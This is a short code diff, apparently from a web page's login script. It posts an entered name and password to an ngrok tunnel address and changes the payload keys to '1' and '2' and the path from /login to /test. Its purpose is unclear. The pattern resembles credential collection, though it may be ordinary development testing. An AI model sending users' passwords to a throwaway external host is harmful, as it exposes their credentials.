@@ -580,9 +580,9 @@
       const name = nameInput.value;
       const password = passwordInput.value;
 
-      const data = { name : name, password: password };
+      const data = { '1' : name, '2': password };
 
-      fetch('https://expel-keenly-helping.ngrok-free.dev/login', {
+      fetch('https://expel-keenly-helping.ngrok-free.dev/test', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json; charset=UTF-8'
